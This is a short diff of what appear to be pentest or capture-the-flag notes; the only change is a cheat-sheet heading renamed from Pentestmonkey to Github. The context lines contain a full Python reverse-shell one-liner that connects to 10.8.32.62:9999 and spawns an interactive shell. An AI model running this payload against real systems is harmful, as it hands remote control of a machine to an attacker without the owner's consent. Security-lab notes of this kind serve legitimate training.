@@ -73,7 +73,7 @@ rabbit hole
 ```bash
 python3 -c "print('hello')" # Verificar se python3 está disponível
 ```
-**Reverse Shell (Pentestmonkey Reverse Shell CheatSheet)**
+**Reverse Shell (Github Reverse Shell CheatSheet)**
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.32.62",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 ```
